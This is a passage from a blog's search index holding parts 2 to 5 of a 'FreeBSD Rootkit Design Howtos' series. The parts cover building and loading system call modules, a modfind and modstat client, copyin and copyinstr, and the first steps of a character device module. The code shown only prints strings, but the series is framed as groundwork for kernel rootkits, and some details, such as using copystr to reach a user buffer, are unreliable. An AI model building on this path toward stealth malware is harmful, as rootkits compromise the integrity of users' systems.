-std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c sc_example.c ld  -d -warn-common -r -d -o sc_example.ko sc_example.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk sc_example.ko  export_syms | xargs -J% objcopy % sc_example.ko objcopy --strip-debug sc_example.ko  myBSD# ls @       export_syms machine     makefile    sc_example.c    sc_example.ko   sc_example.o    x86   We have successfully compiled our first system call module and we got the *sc_example.ko file!   Loading and Calling   Here’s the final step we need to take to make use of our first system call module, the loading, and the calling. Let’s firstly try to load the module into the running kernel, and then figure out how to issue the system call.   myBSD# kldload ./sc_example.ko System call loaded at offset 210.   Thanks to our event handler, it prints out the system call number which is the offset value of the system call module’s sysent structure in sysent[] table. You’ll soon realize how important it is for us to issue a system call.   Now we have two ways to send command to our system call module, we can either write a user space application, or type a simple command. I will talk about the command first since the user space application will be covered in next session.   myBSD# kldload ./sc_example.ko System call loaded at offset 210. myBSD# perl -e '$str = \"Hello kernel!\\n I am here to dance with you!\";' -e 'syscall(210, $str);' myBSD# dmesg | tail -n 2 Hello kernel!  I am here to dance with you!   Note that we explicitly specified the system call number in that perl command to send our command to our system call module.   That’s all for today, we made an upgraded version of fun kernel printing tookit which can print whatever string you want it to. We’ll talk about how to call a system call module without knowing it’s offset value in the next tutorial. See you there.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-2-system-call-first-kernel-service-module/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 3 - System Call First Kernel Service Application",
        "excerpt":"Welcome back to FreeBSD Kernel Rootkit Design Howtos, we’ll walk through all necessary techniques you need to program your own BSD kernel rookit. Please be sure you’ve read the previous guides before you proceed with this one.   Review   Same as usual, let’s review what we’ve discussed in the last session. Basically a new kind of kernel module was introduced — The system call module, it registers itself as a kernel service and wait for user to call it via system calls.   SYSCALL_MODULE is the registration macro for system call modules to install themselves into the running kernel, and it requires five parameters:           name as a generic name for the system call module            offset value which determines in which location in the sysent[] table to save our system call module’s sysent structure            new_sysent pointer to a sysent_t structure that contains basic info about the system call module such as number of arguments and pointer to it’s implementation function            implementation function defines activities you want your system call module to perform every time when it receives system call       In this session, we’ll make a custom client application that calls our kernel service module directly without knowing the module’s offset value.   The modfind Function   The modfind function is our key to solve the inflexibility issue, it is very useful but a little bit confusing.   As the name implies, the modfind function helps us to find a specific module in a running kernel by giving it the module name. It is sweet ’cause keeping track of module names is much easier than a bunch of module offset values.   Now the confusing part is, opposite to what you may have guessed, the return value of this function is NOT the system call module’s offset value, but it’s id.   Let’s take a look at a sample piece of modfind function code.   #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt;  int modfind(const char *modname);   The modstat Function   As we can only obtain the id of the system call module by calling modfind function, so here’s what really give us answers - the modstat function.   #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt;  int modstat(int modid, struct module_stat *stat);   The int modid is where we should pass the result of modfind function, but we won’t get the offset value from the function’s return value.   Instead, we have to construct a module_stat structure, and the modstat function will save results to it. That is why we are passing a pointer to a module_stat structure as the second parameter.   The module_stat structure is defined in sys/module.h as shown below   FILE: /usr/src/sys/sys/module.h  struct module_stat {         int             version;        /* set to sizeof(struct module_stat) */         char            name[MAXMODNAME];         int             refs;         int             id;         modspecific_t   data; };  typedef union modspecific {         int     intval;         u_int   uintval;         long    longval;         u_long  ulongval; } modspecific_t;   I know this looks messy, but luckily we don’t need to deal with all of them.   The first part of the code is the definition of module_stat structure, and it contains a modspecific_t union which is defined in the second part, our offset value is stored in this union as intval.   Confusing right, you don’t see any variable name here with offset value in it. The good news is, that’s all we have to learn today, we’ll get to the example code after the summary.   Summary   We now know that having a native client to call system call modules is much better than the perl command we used in last session. It is better because,           We don’t have to remember the offset value of the system call module to call it. This is especially useful when we have to maintain multiple system call modules            The offset value of system call module changes every time we reload it. We’ll still have our flexibility since we rely on module name which is not likely to be changed over time       The way how the client works is that we use modfind to find out the id of a given module name, but sadly it’s not the module’s offset value, which we can’t use to issue the system call.   So we have to utilize another function which is modstat that will give us back a modspecific union, in which we can get the real offset value we want from the intval integer.   Here’s a figure to make your life miserable, you can thank me later. : ] Oh god, why I’m so bad at drawing…      Example Code   Now it’s time for us to see some examples. Let’s firstly start with the example from Designing BSD Rootkits: An Introduction to Kernel Hacking with some additional comments to help you understand the code.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //This is the module_stat structure     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sc_example\"), &amp;stat);     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Unlike kernel modules which we need a makefile to automate some extreme nasty stuff, we don’t need one for this simple client side application. We can directly compile the code like this,   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit' myBSD# ls client      client.c   Looks good so far, we’ve got the client executable file. Let’s load the previous sc_example module and try to call it with our client application.   myBSD# kldload ./sc_example.ko System call loaded at offset 210. myBSD# ./client Usage: ./client &lt;string&gt; myBSD# ./client Hey\\ Kernel! Bad system call (core dumped)   We loaded the sc_example module at offset value of 210, we got a nice help message when wrong number of parameter is specified, which is nice, but we end up with a Bad system call error when we give it the right amount of parameters.   This is bad, because we’ve got nearly no clue of what had happened, and what caused it. But just before we panic, let’s calm down and think about this error message which is our only lead to the problem, which says Bad system call.   It is obvious that we were calling a bad kernel module, so bad that our little client crashed. If we called a bad kernel module in our syscall function, then that means the return value of modfind or modstat function is wrong, or maybe both of them are wrong, who knows.   So I did a little bit debugging, and I soon realized that the return value of modfind is -1, which is obviously bad.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application { ...     printf(\"The return value of modfind is: %d\\n\", modfind(\"sc_example\")); ... }   The result says   myBSD# gcc -o client client.c myBSD# ./client The return value of modfind is: -1   Alright, -1, it probably means fail to find this module, or given module was not found. Given that the module name is the only parameter for the modfind function, it is obvious that the module name is wrong.   This is interesting, we all know that the module name is right, so there’s something wrong from the very beginning. The very source of a system call module is of course it’s declaration macro, so let’s look at there and see if we can get any luck.   FILE:/usr/src/sys/sys/sysent.h #define SYSCALL_MODULE(name, offset, new_sysent, evh, arg)      \\ static struct syscall_module_data name##_syscall_mod = {        \\         evh, arg, offset, new_sysent, { 0, NULL, AUE_NULL }     \\ };                                                              \\                                                                 \\ static moduledata_t name##_mod = {                              \\         \"sys/\" #name,                                           \\         syscall_module_handler,                                 \\         &amp;name##_syscall_mod                                     \\ };   Here we go, a module name prefix! That means every kernel module registered with SYSCALL_MODULE will be given a sys/ prefix in front of their names.   Now we know the root of the problem, let’s modify our code and try again.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //We'll get the module statues and store it here.     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sys/sc_example\"), &amp;stat); //With prefix this time     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Everything is the same except modstat(modfind(\"sys/sc_example\"), &amp;stat);. Now compile and run.   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit' myBSD# ./client Hey\\ Kernel!\\ What\\'s\\ Up\\? myBSD# dmesg | tail -n1 Hey Kernel! What's Up?   Yada! Our little client is doing it’s job and we’ve achieved our objectives by calling a system call module without knowing it’s offset value.   That will be all for today, thank you for reading this tutorial, like it and share it to support my work, and I’ll see you in the next tutorial!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-3-system-call-first-kernel-service-application/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 4 - Kernel And User Space Transitions",
        "excerpt":"What’s up geeks, it’s good to see you again! This is the 4th tutorial on FreeBSD Kernel Rootkit Design Howtos. Check back everyday for new tutorials and examples.   Review   Well, in the previous session, we discussed about an upgraded version of client application to issue system calls. We used int modfind(const char *modname); to get the id of a kernel module by specifying module name, and then we successfully retrieved the module’s offset value by calling  int modstat(int modid, struct module_stat *stat); function. We learned that the offset value is actually stored as int intval; in typedef union modspecific which is a sub-union of struct module_stat.   I hope you still remember that we created our very first system call module that expects a string argument to be sent from user land application, and it will then print out the string received. You don’t have to recall the whole process since we’ll redo that in this session, what you do need to recall is that we made a mistake.      modern operating systems segregate it’s memory areas into user space and kernel space, code running in each section don’t directly access each other’s resources. The way we assign a user space structure pointer to a kernel space local variable  (uap = (struct sc_example_args *)syscall_args;) is unsafe and not recommended.    Now it’s time to deal with this problem and fix that example code.   Kernel and User Space Transition   Before we start fixing our example code, I’d like to talk a little bit more about kernel space and user space.   We all know that modern operating systems segregate their virtual memory into user space and kernel space, and commonly user-mode applications run in user space, and system kernel runs in kernel space. Now, the question is why, why such separation exists, what is its purpose.   Actually we can consider user space as isolated sand-boxes, it restricts user land applications so that they don’t mess up with each other’s resources, and most importantly, the kernel space.   As we know, the kernel is the core of any operating system that is in charge of hardware resource allocation, scheduling, I/O, process management, and all sorts of low level stuff. We want to maintain stability and security of the system, so we really don’t want poorly-designed user applications crashing the whole system or malicious user application to modify the behavior of the kernel.   Although it it restricted, but it’s possible for user space and kernel space to access each other’s virtual memory since such communications are necessary. We just have to make sure that we do these in a way that the impact on system stability and security are minimal.      User space CANNOT access kernel space, if you have to, issue a system call   Kernel space CAN access user space, because it literally owns everything of the system. However, it is recommended to copy memory area from user space to kernel space before access it, otherwise may result a fatal panic.      Look at the figure above, it simply says that user-mode applications can only access kernel resources via system calls, and the system call module will return a value or perform pre-defined actions. This is much safer than letting user-mode applications to freely modify kernel resources or calling kernel functions, either kernel resource changing or function calling are performed by pre-programmed and well-designed code running in kernel, which are considered safer and stabler.   The figure also says that kernel modules running in kernel space normally copy user space resources back to it’s own virtual memory area first, and then perform pre-defined actions to either return a value to user space or modify the resource content.   Copying user space resources back to kernel space before referring or modifying is safer and recommended because, if we refer to a user space resource directly from kernel space and it’s swapped out or not faulted in yet, we’ll trigger a fatal panic.   Now let’s figure out how to copy resources around virtual memory areas.   The COPY(9)   Open your terminal and run the following command to see the manpage for all copy functions   myBSD# man copy   Copy functions are copy, copyin, copyout, and copyinstr. What they generally do is      The copy functions are designed to copy contiguous data from one address to another. All but copystr() copy data from user-space to kernel-space or vice-versa.    I find these four function names a little bit confusing, so let me put a figure here to help you remember their usages.      The following is a list of all 4 copy functions definition and usage   copyin()   int copyin(const void *uaddr, void *kaddr, size_t len);   It copies len bytes of data from the user-space address uaddr to the kernel-space address kaddr.   copyout()   int copyout(const void *kaddr, void *uaddr, size_t len);   It copies len bytes of data from the kernel-space address kaddr to the user-space address uaddr.   copyinstr()   int copyinstr(const void *uaddr, void *kaddr, size_t len, size_t *done);   It copies a NUL-terminated string, at most len bytes long, from user-space address uaddr to kernel-space address kaddr. The number of bytes actually copied, including the terminating NUL, is returned in *done (if done is non-NULL).   copystr()   int copystr(const void *kfaddr, void *kdaddr, size_t len, size_t *done);   Copies a NUL-terminated string, at most len bytes long, from kernel-space address kaddr to kernel-space address kaddr. The number of bytes actually copied, including the terminating NUL, is returned in *done (if done is non-NULL).   The Copyin Functions   From the perspective of a system call module, we need to copy memory from user space to kernel space at most of the times. So that there are two copy functions we can utilize to achieve this task, copyin() and copyinstr().   It is necessary to talk about the difference between copyin() and copyinstr() before we choose which one to use for our upgraded example system call module.                          copyin()       copyinstr()                       Direction       From user space to kernel space       From user space to kernel space                 Resource Type       Any user space memory address       NUL-terminated string (ends with \\0)                 Copy Length       Exactly len bytes       At most len bytes long                 Extra Argument       NONE       size_t *done stores the number of bytes actually copied, including the terminating NUL                 Return Value       0 = success EFAULT = bad address       0 = success EFAULT = bad address                 Extra Return Value       ENAMETOOLONG = the string is longer than len bytes       ENAMETOOLONG = the string is longer than len bytes           As you can see from the table above, that these two functions perform basically same actions, but fits under different scenarios. As we need to copy a string from user space to kernel space in our example system call module, we are gonna use copyinstr() this time.   Example Code   Finally here comes our example code, just remember to include the two extra lib files.   /* * FILE: /root/rootkit/4.1/safe_sc_example.c * Example 4.1 * User and Kernel Space Transitions * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;      char kernstr[1024+1]; //This is the place holds a copy of the string in kernel space     int err = 0; //Return stat     size_t size = 0; //Size actually copied      err = copyinstr(uap-&gt;str, &amp;kernstr, 1024, &amp;size);     if (err == EFAULT)         return(err);      printf(\"Safer version output: %s\\n\",kernstr);     return (0); }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,  /* number of arguments */     sc_example  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch(cmd) {     case MOD_LOAD:         uprintf(\"System call loaded at offset %d.\\n\", offset);         break;     case MOD_UNLOAD:         uprintf(\"System call unloaded from offset %d.\\n\", offset);         break;     default:         error = EOPNOTSUPP;         break;     }      return(error); }  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   Save the above code as safe_sc_example.c, and the following as makefile in the same directory   KMOD=   safe_sc_example SRCS=   safe_sc_example.c  .include &lt;bsd.kmod.mk&gt;   Now we can build our safer system call example by issuing make command   myBSD# make Warning: Object directory not changed from original /root/rootkit/4.1 @ -&gt; /usr/src/sys machine -&gt; /usr/src/sys/amd64/include x86 -&gt; /usr/src/sys/x86/include cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c safe_sc_example.c ld  -d -warn-common -r -d -o safe_sc_example.ko safe_sc_example.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk safe_sc_example.ko  export_syms | xargs -J% objcopy % safe_sc_example.ko objcopy --strip-debug safe_sc_example.ko   Check if you have successfully built safe_sc_example.ko file, and load it into the running kernel by   myBSD# kldload ./safe_sc_example.ko System call loaded at offset 210.   Great, now you can use the client application we built in the previous session to make the system call. Just in case you feel as lazy as I do, here’s the client application code again,   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //We'll get the module statues and store it here.     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sys/sc_example\"), &amp;stat); //With prefix this time     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Save the source code in client.c and build it by   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit'   Now we can call our safer system call module example by   myBSD# ./client May\\ the\\ source\\ be\\ with\\ you myBSD# dmesg | tail -n 1 Safer version output: May the source be with you   This is great! We fine-tuned our system call module with the powerful copy functions, this should be enough for now. User and Kernel space transition is a very big topic, it involves many kernel design aspects and concepts, I cannot cover all of them in this short tutorial, but I’ll sure get back to this once we need to.   Hope you enjoy this tutorial, leave a comment below to let me know your suggestions, and May the source be with you!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-4-kernel-and-user-space-transitions/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 5 - Character Device First cdev Module",
        "excerpt":"Sup guys, welcome back to today’s FreeBSD Kernel Rootkit Design Howtos! I know it’s been a couple of days since I posted the previous note, I was dealing with my visa issue.   Review   We have discussed two types of kernel modules in the past 4 sessions: General Kernel Module, and System Call Kernel Module.   Hope you still remember that it took us 3 sessions to discuss the System Call Kernel Module and a tiny little client application, and lastly we discussed a little bit on Kernel/User Space Transitions.   So I guess that’d be enough for the System Call Kernel Module since we already know how to declare it, how to call it, and how to do it in a safe way.   And today we are gonna talk about a new type of kernel module – The Character Device Module, I hope you’ll enjoy.   The Device   Before we discuss what is a Character Device, let’s talk about what is a Device first.   A device is simply components connected with your motherboard, such as your hard disk, USB Drive, Handphone, or even Keyboard and Mouse.   You may have known that one of the most famous “characteristics” of unix-like systems, is  that In UNIX Everything is a File (This is a great article, check this out).   That’s true, and by Everything we mean documents, directories, links, network connections, terminals, inter-process communication, and devices.   All of these are represented as files in the unified local filesystem because they are treated as stream bytes, so you can read, write, lseek, and close them. So getting user input from the keyboard is simply read from the keyboard device file, very nice and clean right?   The benefit of this design is of course a simplified and unified API for all devices, and this was very advanced design back in the day when other operating systems required user to use different commands to copy files from different types of devices.   You get get a list of device files by entering ls /dev in a terminal. /dev is a specific implementation of filesystem called devfs in which all device files are stored and managed.   The Block Device and The Character Device   Now we know that we can interact with a device by accessing its device file, but what actually controls the behavior of a device?   The answer is in the kernel. Since firstly kernel should be the one dealing with hardware, and secondly the segregation between kernel modules can prevent a single hardware error from crashing the whole system.   That means if you are a device driver developer and you are about to work on a new hardware driver for most Unix-like systems, you’ll have to program a Device Kernel Module, and the module should follow the standard and create a file in devfs for users to interact with.   So that the concept of Device Kernel Module is similar to the concept of driver, except that in fact there are many different kinds of device kernel modules designed for different purposes. Here I’m gonna talk about two main types of modern unix-like system device kernel modules, the Block Device Module and the Character Device Module.                  Character Device       Block Device                       Transfers data directly to and from a user process       Disk devices for which the kernel provides caching                 Performs no buffering       Performs buffering and access randomly through a cache                 Read/Write 0 or more bytes in a stream       Read/Write fixed size blocks           Block devices are used to mount disk partitions in some other unix-like systems, and were used by FreeBSD as caching devices. The good news is, as you can see from FreeBSD Handbook: Block Devices, that the block device is deprecated by FreeBSD as a step to modernize the system design.   The caching part was moved upward and is now known as the vnode, so we totally don’t have to worry about block device here, but it’s still good idea to understand the differences between these two types of devices.   To conclude the above boring introduction, background, and design scenario, the Character Device Module, as the most common type of device driver, is simply just another type of kernel module that installs itself in the kernel and provide interface (devfs) represented as file to interact with users.   To successfully declare a character device module, there are three unique things we need to deal with first, we need to have a cdevsw structure, character device functions, and device registration routine. And of course, we’ll have to have an event handler and module declaration macro just like any other kernel modules.   The cdevsw Structure   Like what we have in a system call module, the cdevsw structure is a structure in which we store related information about the character device module, and this structure will be stored in a cdevsw structure table known as the character device switch table.   It works similarly to what we do with system call modules, we have a sysent structure to store some related information, and then we put that structure into the sysent[] table for further reference. So there should be no problem to understand this concept.   The cdevsw structure is defined in sys/conf.h as the following. I added some comments for quick reference.   FILE:/usr/src/sys/sys/conf.h /*  * Character device switch table  */ struct cdevsw {         int                     d_version;         u_int                   d_flags;    /* D_TAPE, D_DISK, D_TTY, D_MEM */         const char              *d_name;    /* Device name in /dev */         d_open_t                *d_open;    /* Func. pointer to dev open function */         d_fdopen_t              *d_fdopen;         d_close_t               *d_close;   /* Func. pointer to dev close function */         d_read_t                *d_read;    /* Func. pointer to dev read function */         d_write_t               *d_write;   /* Func. pointer to dev write function */         d_ioctl_t               *d_ioctl;   /* Func. pointer to dev ioctl (an operation other than a read or a write) function */         d_poll_t                *d_poll;    /* Polls a device to see if there is data to be read or space available for writing */         d_mmap_t                *d_mmap;         d_strategy_t            *d_strategy;         dumper_t                *d_dump;         d_kqfilter_t            *d_kqfilter;         d_purge_t               *d_purge;         d_mmap_single_t         *d_mmap_single;          int32_t                 d_spare0[3];         void                    *d_spare1[3];          /* These fields should not be messed with by drivers */         LIST_HEAD(, cdev)       d_devs;         int                     d_spare2;         union {                 struct cdevsw           *gianttrick;                 SLIST_ENTRY(cdevsw)     postfree_list;         } __d_giant; };   This may look very complicated, but actually there are just two parameters required to declare a character device, the *d_name and the d_version.   The *d_name is obvious the name of the character device module, and will be used to name the filename in /dev.   And the d_version specifies which FreeBSD version this character device module supports, it is defined in sys/conf.h as well.   FILE:/usr/src/sys/sys/conf.h /*  * Version numbers.  */ #define D_VERSION_00    0x20011966 #define D_VERSION_01    0x17032005      /* Add d_uid,gid,mode &amp; kind */ #define D_VERSION_02    0x28042009      /* Add d_mmap_single */ #define D_VERSION_03    0x17122009      /* d_mmap takes memattr,vm_ooffset_t */ #define D_VERSION       D_VERSION_03   The D_VERSION is the same as the latest d_version, so we’re gonna use this unless you want to have your character device module specifically run on a particular legacy version of FreeBSD.   So if you decide to be a superb lazy ass, the simplest definition of cdevsw structure can be,   static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_name =\"cd_example\" };   Unfortunately this character device module pretty much does nothing, despite that we are not required to define all of the functions such as *d_open or *d_close, we still need to have some of them to let our module at least do something.   The Character Device Functions   There are a lot of functions we can choose to implement in order to feature our module, but as I said, it does not require us to implement all of these listed functions in the definition of cdevsw structure.   Oh, FYI, for those functions that are not specified in the declaration of your module’s cdevsw structure, the operation will be considered as not supported.   static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_name =\"cd_example\",     .d_open = open,     .d_close = close,     .d_read = read,     .d_write = write };   In the example above, we explicitly said that we are gonna define a character device module named cd_example_cdevsw, and its gonna have four character device functions with their function pointers specified.   Take note that once we define a cdevsw structure with particular functions, the compiler will expect that function to be implemented, and will result in a compiling error if we fail to do this.   The prototypes of these functions are defined in the same file, sys/conf.h. Access the file for a complete list of all prototypes, I’m just gonna list down the four that we are using,   FILE:/usr/src/sys/sys/conf.h /*  * Character Device Function Prototypes.  */ typedef int d_open_t(struct cdev *dev, int oflags, int devtype, struct thread *td); typedef int d_close_t(struct cdev *dev, int fflag, int devtype, struct thread *td); typedef int d_read_t(struct cdev *dev, struct uio *uio, int ioflag); typedef int d_write_t(struct cdev *dev, struct uio *uio, int ioflag);   To quickly give you an overall understanding of how this works, we are gonna firstly create a read-only character device module. And by read-only, it means that we can only read stream bytes from the module which runs in the kernel back to the user space.   // Function prototype d_read_t read; //d_read_t is typedef'd in sys/conf.h  // Define a read-only device static struct cdevsw ro_cdevsw = {     .d_version = D_VERSION,     .d_read = read,     .d_name =\"cd_example_ro\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int read(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;     if (len &lt;= 0)         error = -1;     else         /* Return the saved character string to userland. */         copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len);      return(error); }   In order to implement the read function, we firstly defined it with the d_read_t prototype. Then we defined a cdevsw structure called ro_cdevsw with only one function pointer passed, the read function.   Now since we are gonna read a string from the kernel back to the user space, we at least need a string in the kernel, right? So we defined a string called buf[512+1].   Finally we reached the implementation of the read function, everything is usual except that we used copystr() here.   I hope you still remember that there are four copy functions, copyin(), copyinstr(), copyout(), and copystr(). All these four functions copy a continues data from kernel space to user space or vise versa except copystr(). copystr() function copies data from one kernel space address to another kernel space address. It is defined in sys/systm.h with following function prototype.   FILE: /usr/src/sys/sys/systm.h int     copystr(const void * __restrict kfaddr, void * __restrict kdaddr,             size_t len, size_t * __restrict lencopied)             __nonnull(1) __nonnull(2);   What we did with copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len); was to copy data from buf (which is a string in kernel space) to uio-&gt;uio_iov-&gt;iov_base which as a matter of fact, is also a kernel address, with maximum length 513, and save copied length to len.   It’s strange that we used copystr() function, ‘cause it copies data from kernel space address to another kernel space address, but we want to copy the buf[] string from kernel back to user space. This is obviously nothing like a read operation that we expected.   To answer this question, we have to take a look into the destination kernel space address  uio-&gt;uio_iov-&gt;iov_base that came out of nowhere.   In fact, the *uio structure does not came out of nowhere, it is actually defined in the read function prototype, and it was passed to our read function like this: int read(struct cdev *dev, struct uio *uio, int ioflag){}. That means every read action performed to a character device module from the user space needs to pass the *uio structure.   So now the question is, what is *uio, and why *uio. Here’s the definition of it in sys/uio.h.   FILE:/usr/src/sys/sys/uio.h struct uio {         struct  iovec *uio_iov;         /* scatter/gather list */         int     uio_iovcnt;             /* length of scatter/gather list */         off_t   uio_offset;             /* offset in target object */         ssize_t uio_resid;              /* remaining bytes to process */         enum    uio_seg uio_segflg;     /* address space */         enum    uio_rw uio_rw;          /* operation */         struct  thread *uio_td;         /* owner */ };   I’ll leave the why question to UIO(9) manpage, it says,      As a result of any read(2), write(2), readv(2), or writev(2) system call that is being passed to a character-device driver, the appropriate driver d_read or d_write entry will be called with a pointer to a struct uio being passed.     The transfer request is encoded in this structure. The driver itself should use uiomove() or  uiomove_nofault() to get at the data in this structure.    That means we’ve got to have uio passed to read() or write() function and then use uiomove() or uiomove_nofault() to,      The functions uiomove() and uiomove_nofault() are used to transfer data between buffers and I/O vectors that might possibly cross the user/kernel space boundary.    Now let’s take a look at iovec *uio_iov array. The I/O vector is defined in sys/_iovec.h   FILE:/usr/src/sys/sys/_iovec.h struct iovec {         void    *iov_base;      /* Base address. */         size_t   iov_len;       /* Length. */ };   Take note that the iov_base is the base address of the I/O vector, so by copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len); what we are really doing here is that we copied maximum 513 length of stream bytes from the starting address of the buffer string &amp;buf to the base address of I/O vector uio-&gt;uio_iov-&gt;iov_base.   We’ll get to the uiomove() function later, as for now, let’s discuss about the very last new thing we have to know to declare a character device module.   The Device Registration Routine   The registration of a device module is accomplished by calling the declaration module called DEV_MODULE. Before that, we need to have an event handler which defines the actions to be performed when the device module is loaded or unloaded.   This is simple, we call make_dev() function to register our character device module with kernel and create the device file in devfs when the module is loaded, and we call destroy_dev() function to unregister the module and remove the device file from /dev when the module is unloaded.   make_dev() function   FILE:/usr/src/sys/sys/conf.h struct cdev *make_dev(     struct cdevsw *_devsw, //pointer to cdevsw structure of the device module which was defined previously     int _unit, //Normally set to 0     uid_t _uid, //The owner ID of the device file     gid_t _gid, //The owner group ID of the device file     int _perms, //The permissions of the device file, e.g. 0600     const char *_fmt, //The name of the device ...) __printflike(6, 7);   This function is straight forward, we pass the cdevsw structure to the make_dev() function to finally get it registered into the character device switch table. What’s new is the return value of the function, which is a cdev structure. Well we’ve already discussed about the cdevsw structure, so what’s a cdev structure?   cdev structure   Let’s take a look at the definition of the cdev structure which is defined in sys/conf.h as shown below,   struct cdev {         void            *__si_reserved;         u_int           si_flags; #define SI_ETERNAL      0x0001  /* never destroyed */ #define SI_ALIAS        0x0002  /* carrier of alias name */ #define SI_NAMED        0x0004  /* make_dev{_alias} has been called */ #define SI_CHEAPCLONE   0x0008  /* can be removed_dev'ed when vnode reclaims */ #define SI_CHILD        0x0010  /* child of another struct cdev **/ #define SI_DEVOPEN      0x0020  /* opened by device */ #define SI_CONSOPEN     0x0040  /* opened by console */ #define SI_DUMPDEV      0x0080  /* is kernel dumpdev */ #define SI_CANDELETE    0x0100  /* can do BIO_DELETE */ #define SI_CLONELIST    0x0200  /* on a clone list */         struct timespec si_atime;         struct timespec si_ctime;         struct timespec si_mtime;         uid_t           si_uid;         gid_t           si_gid;         mode_t          si_mode;         struct ucred    *si_cred;       /* cached clone-time credential */         int             si_drv0;         int             si_refcount;         LIST_ENTRY(cdev)        si_list;         LIST_ENTRY(cdev)        si_clone;         LIST_HEAD(, cdev)       si_children;         LIST_ENTRY(cdev)        si_siblings;         struct cdev *si_parent;         char            *si_name;         void            *si_drv1, *si_drv2;         struct cdevsw   *si_devsw;         int             si_iosize_max;  /* maximum I/O size (for physio &amp;al) */         u_long          si_usecount;         u_long          si_threadcount;         union {                 struct snapdata *__sid_snapdata;         } __si_u;         char            __si_namebuf[SPECNAMELEN + 1]; };   This look scary, but we don’t have to worry about all these parameters. Since it is a returen value passed to us, we’ll have all necessary information set for us.   destroy_dev() function   Everything is just automagical, oh, except one thing 